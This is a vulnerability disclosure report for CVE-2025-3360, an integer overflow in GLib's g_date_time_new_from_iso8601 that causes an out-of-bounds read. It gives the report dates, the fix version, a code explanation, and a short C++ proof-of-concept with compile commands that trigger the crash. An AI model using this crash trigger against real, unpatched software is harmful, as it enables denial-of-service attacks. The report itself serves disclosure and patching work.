(CVE-2025-3360)(#YWH-PGM9867-43) Integer overflow in g_date_time_new_from_iso8601

YesWeHack Report ID: #YWH-PGM9867-43

Date Reported: February 13, 2025

Date Fixed: February 18, 2025

Fix Version: 2.82.5

Fix: !4498 (merged)

CVE: CVE-2025-3360

CWE: CWE-127: Buffer Under-read, CWE-190: Integer Overflow

Discovery Credit: chamal de silva

Additional Thanks: Sovereign Tech Resilience program of the Sovereign Tech Agency

Description

This bug is present in g_date_time_new_from_iso8601 method.
This method uses gint type variables to store length.

gint length, date_length = -1;

Then length is used as an index in this for loop.

for (length = 0; text[length] != '\0'; length++)
{
  if (date_length < 0 && (text[length] == 'T' || text[length] == 't' || text[length] == ' '))
    date_length = length;
}

Since length is signed int type, it will overflow after INT_MAX and become a negative value.
Then accessing text[length] will cause a segmentation fault.

On release builds accessing text[length] in while loop does not cause segmentation fault.
But segmentation fault happens in parse_iso8601_timezone method which is in call hierarchy of g_date_time_new_from_iso8601 method.
I could not figure out the reason for that behavior.

Exploitation

1.Copy this c++ program to a text file and save as test.cc

#include <stdlib.h>
#include <glib.h>
#include <iostream>
#include <gio/gio.h>

int main(int argc, char* args[]){
  size_t size = 2147483747;
  gchar* text = (gchar*)malloc(size);
  memset(text,'a',size);
  text[1] = 'T';
  text[size-1] = '\0';
  g_date_time_new_from_iso8601(text, 0);
  free(text); 
}

2.Compile with address sanitizer and run.

g++ -g -fsanitize=address -o test test.cc $(pkg-config --cflags --libs glib-2.0)
./test

